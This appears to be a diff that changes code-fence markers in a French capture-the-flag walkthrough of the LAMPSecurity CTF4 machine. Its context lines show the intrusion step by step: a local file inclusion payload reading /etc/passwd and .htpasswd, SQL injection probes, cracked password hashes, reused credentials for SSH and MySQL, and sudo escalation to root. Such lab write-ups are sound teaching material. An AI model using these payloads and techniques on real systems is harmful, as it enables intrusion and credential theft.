@@ -15,7 +15,7 @@ Pour info le système est une RHEL 3.
 Approcher la bête
 -----------------
 
-```plain
+```
 Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-07 08:31 CEST
 Nmap scan report for 192.168.1.99
 Host is up (0.00017s latency).
@@ -47,7 +47,7 @@ A la racine web on trouve un site simple dans le style blog avec différentes se
 
 On teste quelques remontées d'arborescence et paff ! Le coup est parti tout seul.  
 
-```plain
+```
 http://192.168.1.99/index.html?page=../../../../etc/passwd%00&title=Blog
 
 root:x:0:0:root:/root:/bin/bash
@@ -67,7 +67,7 @@ ossecr:x:508:508::/var/ossec:/sbin/nologin
 
 Dans d'autres URLs on trouve un paramètre id. Et repaff !  
 
-```plain
+```
 http://192.168.1.99/index.html?page=blog&title=Blog&id=%22%27
 Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /var/www/html/pages/blog.php on line 20
 ```
@@ -118,7 +118,7 @@ fd.close()
 
 Ça me donne :  
 
-```plain
+```
 Contenu trouve avec /var/log/lastlog
 Contenu trouve avec /var/run/utmp
 Contenu trouve avec /var/log/messages
@@ -149,7 +149,7 @@ A partir de là plusieurs angles d'attaque sont possibles. J'ai choisi de m'orie
 
 Via la faille include (*/index.html?page=../../../../../../var/www/html/restricted/.htaccess%00&title=Blog*) on obtient le *.htaccess* suivant :  
 
-```plain
+```
 AuthType Basic
 AuthName "Restricted - authentication required"
 AuthUserFile /var/www/html/restricted/.htpasswd
@@ -158,7 +158,7 @@ Require valid-user
 
 Et son *.htpasswd* :  
 
-```plain
+```
 ghighland:8RkVRDjjkJhq6
 pmoore:xHaymgB2KxbJU
 jdurbin:DPdoXSwmSWpYo
@@ -167,7 +167,7 @@ sorzek:z/a8PtVaqxwWg
 
 Ces hashs DES sont cassés très vite via dictionnaire et brute-force :  
 
-```plain
+```
 ghighland:undone1:::::::
 pmoore:Homesite:::::::
 jdurbin:Sue1978:::::::
@@ -178,7 +178,7 @@ En se connectant sous */restricted/* on trouve deux fichiers txt.
 
 Un fichier blog\_instructions.txt :  
 
-```plain
+```
 Instructions for Posting to the Blog
 ====================================
 
@@ -189,7 +189,7 @@ Once you're logged in click the "Blog" link.
 
 Un fichier webmail\_instructions.txt :  
 
-```plain
+```
 Instructions for Webmail
 ========================
 
@@ -202,14 +202,14 @@ Let Don or James know if you're having problems.
 
 Apparemment les identifiants de machine servent un peu à tout... Je me connecte en SSH avec les identifiants de *ghighland* et paff ! Ça passe encore !  
 
-```plain
+```
 [ghighland@ctf4 ~]$ uname -a
 Linux ctf4.sas.upenn.edu 2.6.15-1.2054_FC5 #1 Tue Mar 14 15:48:33 EST 2006 i686 i686 i386 GNU/Linux
 ```
 
 Je trouve des identifiants MySQL dans */var/www/html/conf/config.ini* :  
 
-```plain
+```
 dbhost  =       localhost
 db      =       ehks
 dbuser  =       root
@@ -218,7 +218,7 @@ dbpass  =       database
 
 Un petit tour avec le client MySQL :  
 
-```plain
+```
 mysql> show databases;
 +--------------------+
 | Database           |
@@ -234,7 +234,7 @@ mysql> show databases;
 
 Et dans la table *ehks* on trouve une table user :  
 
-```plain
+```
 mysql> select * from user;
 +---------+-----------+----------------------------------+
 | user_id | user_name | user_pass                        |
@@ -254,7 +254,7 @@ Dans la base *calendar* rien de bien intéressant... Un compte admin avec le pas
 
 Comme le laissait supposer la présence du *SquirrelMail*, les utilisateurs ont chacun une boite de messagerie.  
 
-```plain
+```
 [ghighland@ctf4 www]$ ls /var/spool/mail/ -lh
 total 1.8M
 -rw------- 1 achen     mail 838K Jul  7 11:32 achen
@@ -268,7 +268,7 @@ total 1.8M
 
 Qu'ai-je reçu en tant que *Greg Highland* ?  
 
-```plain
+```
 From dstevens@ctf4.sas.upenn.edu  Mon Mar  9 10:52:25 2009
 Return-Path: <dstevens@ctf4.sas.upenn.edu>
 Received: from 192.168.0.6 (ctf4.sas.upenn.edu [127.0.0.1])
@@ -345,7 +345,7 @@ Le coup de grace
 
 Dans son *.bash\_history* on trouve des appels à *su* et *sudo*. On s’aperçoit vite que ce dernier est effectivement administrateur :  
 
-```plain
+```
 [dstevens@ctf4 ~]$ sudo -l
 Password:
 User dstevens may run the following commands on this host:
@@ -359,7 +359,7 @@ root:$1$DSHH/MlC$DH8ClhHKeagYW4PwxICZC0:14309:0:99999:7:::
 
 Le mot de passe se casse facilement :  
 
-```plain
+```
 $ /opt/jtr/john --wordlist=mega_dict.txt  hash.txt 
 Loaded 1 password hash (FreeBSD MD5 [128/128 AVX intrinsics 12x])
 guesses: 0  time: 0:00:00:02 0.53% (ETA: Mon Jul  7 22:12:54 2014)  c/s: 35325  trying: 015922726 - 015924737
@@ -371,14 +371,14 @@ Alternativement il est possible de passer root via le compte *achen*.
 
 Premièrement ce dernier a des accès encore plus ouverts (lancement de commandes en tant que root sans avoir à saisir le moindre mot de passe) :  
 
-```plain
+```
 User achen may run the following commands on this host:
     (ALL) NOPASSWD: ALL
 ```
 
 En plus dans son historique de commande on retrouve le mot de passe root :  
 
-```plain
+```
 --- snip ---
 sudo sy
 su
@@ -392,7 +392,7 @@ Autres vecteurs d'attaque web
 
 *Wapiti* a identifié une faille d'injection SQL dans la section */admin/* inutilement protégée par javascript :  
 
-```plain
+```
 Injection MySQL dans http://192.168.1.99/admin/index.php via une injection dans le paramètre username
 Evil request:
 POST /admin/index.php HTTP/1.1
